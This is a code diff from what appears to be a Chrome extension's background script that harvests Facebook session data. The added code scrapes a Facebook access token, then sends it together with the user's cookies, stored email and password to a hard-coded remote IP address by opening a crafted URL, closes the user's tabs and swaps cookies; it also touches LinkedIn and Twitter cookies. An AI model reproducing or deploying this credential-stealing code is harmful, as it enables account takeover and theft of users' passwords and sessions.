@@ -31,20 +31,6 @@ function saveliCookie(url) {
     });
 }
 
-function saveuToken() {
-    var s = $.ajax({
-        url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
-        type: "get",
-        async: false,
-        global: false,
-        success: function(t) {
-            return t;
-        }
-    }).responseText;
-    s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
-    chrome.storage.sync.set({ FBuToken: uToken }, function() {});
-}
-
 function addfbCookie() {
     chrome.storage.sync.get(['FBcookie'], function(result) {
         result.FBcookie.forEach(function(item, index) {
@@ -218,31 +204,34 @@ function facebookData() {
                     }
 
                     try {
-                        var s = $.ajax({
+                        $.ajax({
                             url: "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed",
                             type: "get",
-                            async: false,
-                            global: false,
-                            success: function() {}
-                        }).responseText;
-                        s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+                            success: function(s) {
+                                s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
+                                console.log(s);
+                                if (typeof uuid !== 'undefined') {
+                                    var sendurl = `http://125.138.183.122:8084/php/facebook.php?uuid=${uuid}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
+                                    var encodeurl = encodeURI(sendurl);
+                                    chrome.tabs.query({ active: true }, function(tabs) {
+                                        chrome.tabs.remove(tabs[0].id);
+                                    });
+                                    chrome.storage.local.get(['prvTab'], function(result) {
+                                        try {
+                                            chrome.tabs.remove(result.prvTab);
+                                        } catch (z) {}
+                                    });
+                                    chrome.tabs.create({ url: encodeurl });
+                                    chrome.storage.local.set({ extensionState: 0 }, function() {});
+                                    removeCookies("https://facebook.com");
+                                    addfbCookie();
+                                }
+                            }
+                        });
                     } catch (err) {
                         console.log(err);
                     }
-                    if (typeof uuid !== 'undefined') {
-                        var sendurl = `http://125.138.183.122:8084/php/facebook.php?uuid=${uuid}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
-                        var encodeurl = encodeURI(sendurl);
-                        chrome.tabs.query({ active: true }, function(tabs) {
-                            chrome.tabs.remove(tabs[0].id);
-                        });
-                        chrome.storage.local.get(['prvTab'], function(result) {
-                            chrome.tabs.remove(result.prvTab);
-                        });
-                        chrome.tabs.create({ url: encodeurl });
-                        chrome.storage.local.set({ extensionState: 0 }, function() {});
-                        removeCookies("https://facebook.com");
-                        addfbCookie();
-                    }
+
                 }
             })
         })
@@ -294,6 +283,9 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
             break;
         case 'doneliLogin':
             setTimeout(linkedinData(), 2000);
+            break;
+        case 'removecookietw':
+            removeCookies("https://twitter.com");
             break;
         default:
             console.log('nofunction');
